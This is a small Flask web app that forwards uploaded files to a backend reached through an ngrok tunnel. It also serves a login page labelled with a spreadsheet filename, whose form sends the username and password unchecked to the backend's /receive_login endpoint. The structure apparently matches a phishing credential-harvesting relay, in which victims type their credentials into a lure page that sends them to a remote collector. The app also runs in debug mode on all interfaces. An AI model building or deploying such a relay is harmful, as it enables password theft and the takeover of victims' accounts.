from flask import Flask, render_template, request
import requests
import os

app = Flask(__name__)

# Load backend URL from environment variable
NGROK_BACKEND_URL = os.environ.get('NGROK_BACKEND_URL')
print("🔧 NGROK_BACKEND_URL =", NGROK_BACKEND_URL)

@app.route('/', methods=['GET'])
def upload_form():
    return render_template('upload.html')


@app.route('/submit', methods=['POST'])
def submit():
    file = request.files.get('file')
    if not file:
        print("🚫 No file received in request.files")
        return "No file received", 400

    print(f"📦 Received file: {file.filename}, type: {file.content_type}")

    # Forward the file to the backend
    files = {
        'file': (file.filename, file.stream, file.mimetype)
    }

    try:
        forward_url = f"{NGROK_BACKEND_URL}/submit"
        print(f"📤 Forwarding to backend URL: {forward_url}")
        response = requests.post(forward_url, files=files)
        print("✅ Backend response status:", response.status_code)
        print("✅ Backend response body:", response.text)
        return f"File forwarded to backend. Response: {response.text}"
    except requests.exceptions.RequestException as e:
        print("❌ Failed to reach backend:", e)
        return f"Failed to reach backend: {e}", 500

@app.route('/login', methods=['GET'])
def login_form():
    filename = request.args.get('file', 'unknown.xlsx')
    return render_template('login.html', filename=filename)


@app.route('/login', methods=['POST'])
def login_submit():
    username = request.form.get('username')
    password = request.form.get('password')

    try:
        response = requests.post(f"{NGROK_BACKEND_URL}/receive_login", data={
            'username': username,
            'password': password
        })
        return f"Login sent to backend. Response: {response.text}"
    except requests.exceptions.RequestException as e:
        return f"Failed to send login to backend: {e}", 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=True, host='0.0.0.0', port=port)
